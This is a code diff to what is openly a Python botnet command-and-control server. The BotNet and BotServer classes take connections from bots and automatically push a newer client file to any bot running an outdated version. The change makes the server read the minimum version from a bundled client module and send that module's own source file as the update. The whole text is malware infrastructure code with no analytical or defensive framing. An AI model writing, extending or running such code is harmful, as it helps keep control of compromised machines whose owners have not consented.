@@ -9,11 +9,13 @@ import os
 
 try:
     from server import formatsock, server
+    from server.client import client
 except:
     import formatsock
     import server
+    from client import client
 
-MIN_CLIENT_VERSION = "0.2"
+MIN_CLIENT_VERSION = client.__version__
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
@@ -196,12 +198,11 @@ class BotNet(Thread):
 
 
 class BotServer(Thread):
-    def __init__(self, tcpsock, botnet, socketio, clientfile):
+    def __init__(self, tcpsock, botnet, socketio):
         Thread.__init__(self)
         self.tcpsock = tcpsock
         self.botnet = botnet
         self.socketio = socketio
-        self.clientfile = clientfile
         self.clientversion = LooseVersion(MIN_CLIENT_VERSION)
 
     def run(self):
@@ -218,7 +219,7 @@ class BotServer(Thread):
             if botversion < self.clientversion:
                 # Autoupdate
                 print("[*] Updating {} on version {}".format(user, botversion))
-                bot.sendClientFile(open(self.clientfile, 'rb'))
+                bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
             else:
                 print("[+] Received connection from {}".format(user))
                 self.botnet.addConnection(user, bot)
